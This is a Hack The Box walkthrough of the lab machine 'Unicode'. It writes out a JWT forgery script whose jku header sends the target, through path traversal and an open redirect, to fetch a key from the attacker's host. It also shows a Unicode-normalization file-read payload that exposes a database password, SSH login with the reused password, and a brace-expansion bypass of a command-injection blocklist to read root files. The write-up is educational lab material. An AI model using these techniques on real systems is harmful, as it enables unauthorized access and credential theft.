# HTB Unicode — Full Walkthrough
**Difficulty:** Medium | **OS:** Linux | **IP:** 10.129.12.87

---

## Table of Contents
1. [Mindset & Approach](#mindset)
2. [Reconnaissance — Nmap](#recon)
3. [Web Enumeration](#web)
4. [JWT Forgery (RS256 + JKU Abuse)](#jwt)
5. [Local File Inclusion via Unicode Normalization](#lfi)
6. [Shell as `code` (User Flag)](#user)
7. [Privilege Escalation via `sudo treport`](#privesc)
8. [Root Flag](#root)
9. [Key Takeaways](#takeaways)

---

## 1. Mindset & Approach {#mindset}

Before touching a machine, the hacker mindset is:

> **"Every feature is an attack surface. Every input is a potential injection point. Every trust assumption is a potential bypass."**

We approach this in layers:
- **What ports are open?** → What services are running?
- **What does the app do?** → What does it trust? What does it validate?
- **Where does it fail?** → Can we abuse the gap between what it *checks* and what it *does*?

---

## 2. Reconnaissance — Nmap {#recon}

### What we ran
```bash
nmap -p- --min-rate 10000 10.129.12.87
nmap -p 22,80 -sCV 10.129.12.87
```

### What we found
```
22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    nginx 1.18.0
```

### Why we did it this way
- `-p-` scans **all 65535 ports**, not just the top 1000. Services are often hidden on high ports.
- `--min-rate 10000` speeds up the scan significantly on HTB's stable network.
- `-sCV` on specific ports runs **version detection** (`-sV`) and **default scripts** (`-sC`) to grab banners, headers, and service details.

### Hacker mindset
Only two ports open means our entire attack surface is the web app on port 80. SSH is almost certainly the path in — but only after we find credentials or a key through the web app. We ignore SSH for now and focus everything on port 80.

---

## 3. Web Enumeration {#web}

### Add hostname to /etc/hosts
```bash
echo "10.129.12.87 hackmedia.htb" | sudo tee -a /etc/hosts
```

**Why:** The nmap HTTP response referenced `hackmedia.htb`. Web apps often behave differently (or only work properly) when accessed by hostname rather than IP due to virtual hosting. Always add discovered hostnames to `/etc/hosts`.

### Browse the site
Visiting `http://hackmedia.htb` shows a "threat intelligence" company site. Key observations:
- `/login/` and `/register/` pages exist
- A link in the nav goes to `/redirect/?url=google.com` — **this is an open redirect, file it away**
- Footer says "Powered by Flask" — Python backend

### Register an account and log in
After registering and logging in, we get redirected to `/dashboard`. The interesting part is in the HTTP response headers — a cookie is set:

```
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ...
```

### Decode the JWT
A JWT (JSON Web Token) is three base64url-encoded parts separated by dots:
- **Header** — algorithm and metadata
- **Payload** — claims (who you are)
- **Signature** — cryptographic proof the token is legit

Decoding the header reveals:
```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://hackmedia.htb/static/jwks.json"
}
```

Decoding the payload reveals:
```json
{
  "user": "testuser"
}
```

### Why this matters
- **RS256** means the token is signed with an RSA *private* key and verified with a *public* key. Unlike HS256 (symmetric/secret), the public key can be published — and here it is, at the `jku` URL.
- **`jku` (JWK Set URL)** is a header telling the server *where to fetch the public key* to verify this token. This is the attack surface.

### Hacker mindset
> "The server fetches the public key from a URL. That URL is in the token itself, which *I* control. If I can make the server fetch a key *I* host, I can sign tokens with my own private key and impersonate anyone — including `admin`."

The only obstacle: the server probably only trusts URLs on its own domain.

---

## 4. JWT Forgery (RS256 + JKU Abuse) {#jwt}

### The full exploit chain

```
Our Server (serves our jwks.json)
        ↑
        |  open redirect
hackmedia.htb/redirect/?url=10.10.16.84/jwks.json
        ↑
        |  path traversal in jku
hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json
```

### Step 1 — Generate our own RSA key pair
```bash
cd /tmp
openssl genrsa -out jwtRSA256-private.pem 2048
openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem
```

**Why:** We need our own RSA private key to sign the forged token. We'll publish the matching public key on our HTTP server so the target can "verify" it — but it's our key, so we control what gets verified.

### Step 2 — Build jwks.json and forge the JWT
```python
python3 -c "
import json, base64
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

with open('/tmp/jwtRSA256-private.pem', 'rb') as f:
    priv = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())

nums = priv.public_key().public_numbers()
n = base64.urlsafe_b64encode(nums.n.to_bytes((nums.n.bit_length()+7)//8,'big')).rstrip(b'=').decode()
e = base64.urlsafe_b64encode(nums.e.to_bytes((nums.e.bit_length()+7)//8,'big')).rstrip(b'=').decode()

jwks = {'keys':[{'kty':'RSA','use':'sig','kid':'hackthebox','alg':'RS256','n':n,'e':e}]}
with open('/tmp/jwks.json','w') as f:
    json.dump(jwks, f, indent=4)

def b64u(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {'typ':'JWT','alg':'RS256','jku':'http://hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json'}
payload = {'user':'admin'}
h = b64u(json.dumps(header,separators=(',',':')))
p = b64u(json.dumps(payload,separators=(',',':')))
sig = base64.urlsafe_b64encode(priv.sign(f'{h}.{p}'.encode(), padding.PKCS1v15(), hashes.SHA256())).rstrip(b'=').decode()
print(f'{h}.{p}.{sig}')
"
```

**Breaking down the `jku` value:**
```
http://hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json
```
- The server checks that `jku` starts with `http://hackmedia.htb/static/` —  it does
- But `/static/../` resolves to just `/` via path traversal
- So the real URL hit is `http://hackmedia.htb/redirect/?url=10.10.16.84/jwks.json`
- That open redirect we noted earlier sends the server to *our* machine
- We serve our `jwks.json` with our public key

### Step 3 — Serve the key and set the cookie
```bash
cd /tmp && python3 -m http.server 80
```

Replace the `auth` cookie in the browser with the forged JWT. When the server validates the token, it:
1. Reads `jku` from the header → follows the redirect → hits our server → gets our `jwks.json`
2. Uses our public key to verify the signature — which validates perfectly because we signed it with the matching private key
3. Reads `"user": "admin"` from the payload and grants admin access

**Confirmed:** The HTTP server logs `GET /jwks.json HTTP/1.1" 200` — the server trusted our key.

### What we now have
Admin dashboard access, with new links pointing to `/display/?page=monthly.pdf`.

---

## 5. Local File Inclusion via Unicode Normalization {#lfi}

### The vulnerability
The `/display/?page=` endpoint loads files from the filesystem based on user input. Trying `?page=/etc/passwd` returns a filtering error:

> "we do a lot input filtering you can never bypass our filters"

Testing reveals the blocklist includes:
- `../` (path traversal)
- `/etc`, `/var`, `/home` (key directories)

### The bypass — Unicode Normalization
The box is named "Unicode" for a reason. Many web frameworks normalize unicode characters — converting lookalike unicode characters to their ASCII equivalents — *after* the WAF/filter has already run.

The character `‥` (U+2025, TWO DOT LEADER, encoded as `%E2%80%A5`) looks like two dots but is a single unicode character. After normalization, it becomes `..`.

So:
```
%E2%80%A5/  →  (after normalization) →  ../
```

The filter sees `%E2%80%A5/` and passes it. The filesystem sees `../` and traverses up.

### Reading db.yaml
```bash
curl -s 'http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/home/code/coder/db.yaml' \
  --cookie 'auth=<forged_jwt>'
```

**Why that path?** We know from the nginx config (also readable via LFI at `/etc/nginx/sites-available/default`) that the app lives in `/home/code/coder/`. Four `%E2%80%A5/` sequences traverse up four directory levels from wherever the app is serving files.

**Result:**
```yaml
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```

### Hacker mindset
> "The filter only catches what it knows to look for. If I can represent the same path in a way the filter doesn't recognize, but the app/OS does, I win. Unicode normalization is exactly that gap."

---

## 6. Shell as `code` (User Flag) {#user}

### SSH in
```bash
ssh code@10.129.12.87
# password: B3stC0d3r2021@@!
```

**Why this works:** The database user `code` happens to be a system user too (we can see `code:x:1000:1000` in `/etc/passwd`), and they reused the same password.

**Lesson:** Never reuse credentials across services. Database passwords and system passwords should always be different.

```bash
cat ~/user.txt
# 443fc6[redacted]67361b1
```

---

## 7. Privilege Escalation via `sudo treport` {#privesc}

### Enumeration
First thing on any new shell: check what we can run as root.

```bash
sudo -l
```

Output:
```
(root) NOPASSWD: /usr/bin/treport
```

We can run `/usr/bin/treport` as root with no password. This is our escalation path.

### Analyzing treport
Running the binary shows a menu:
```
1. Create Threat Report
2. Read Threat Report
3. Download A Threat Report
4. Quit
```

The binary is actually a Python script packaged with PyInstaller into an ELF. The key code in option 3 is:

```python
def download(self):
    command_injection_list = ['$','`',';','&','|','||','>','<','?',"'",'@','#','$','%','^','(',')']
    ip = input('Enter the IP/file_name:')
    
    # Filter 1: no whitespace
    if bool(re.search('\\s', ip)):
        sys.exit(0)
    
    # Filter 2: block certain URL schemes
    if 'file' in ip or 'gopher' in ip or 'mysql' in ip:
        sys.exit(0)
    
    # Filter 3: block special chars (but NOT curly braces!)
    for vars in command_injection_list:
        if vars in ip:
            sys.exit(0)
    
    cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
    os.system(cmd)
```

### The vulnerabilities

**Vulnerability 1 — Case-sensitive filter:**
The check is `if 'file' in ip` — lowercase only. `File:///root/root.txt` passes the filter but curl treats it identically to `file:///root/root.txt`.

**Vulnerability 2 — Bash brace expansion:**
Curly braces `{}` are not in the blocklist. Bash expands `{a,b,c}` into separate arguments `a b c`. So:

```bash
curl {File:///root/root.txt,-o-} -o /root/reports/threat_report_XX_XX_XX
```
becomes:
```bash
curl File:///root/root.txt -o- -o /root/reports/threat_report_XX_XX_XX
```

The `-o-` flag tells curl to output to stdout instead of a file, so the content is printed directly to the terminal.

**Vulnerability 3 — No whitespace needed:**
The filter blocks whitespace, but brace expansion naturally separates the arguments without spaces.

### The exploit
```bash
sudo /usr/bin/treport
```
```
Enter your choice: 3
Enter the IP/file_name: {File:///root/root.txt,-o-}
```

---

## 8. Root Flag {#root}

```
fe07d8[redacted]4b837ec4c
```

---

## 9. Key Takeaways {#takeaways}

| Vulnerability | Root Cause | Lesson |
|---|---|---|
| JWT JKU injection | Server trusts user-supplied key URL | Never fetch cryptographic material from attacker-controlled URLs |
| Open redirect + path traversal | Allowlist only checked prefix, not full path | Validate the *resolved* URL, not the raw string |
| Unicode normalization LFI | Filter runs before normalization | Sanitize input *after* normalization, not before |
| Credential reuse | DB password = system password | Each service must have a unique credential |
| `sudo` binary with curl injection | `file` check is case-sensitive, `{}` not blocked | Filter all cases; prefer allowlists over blocklists |

### The hacker mindset in one sentence per step:
1. **Nmap:** *Know your surface before you attack.*
2. **JWT analysis:** *Every piece of data the server returns tells you something about how it thinks.*
3. **JKU abuse:** *If the server fetches something from a URL you control, you control what it trusts.*
4. **Unicode bypass:** *Filters that run before normalization can be bypassed with lookalike characters.*
5. **Credential reuse:** *People are lazy — try every password you find everywhere.*
6. **treport injection:** *Blocklists fail when you find a character they didn't think to block.*
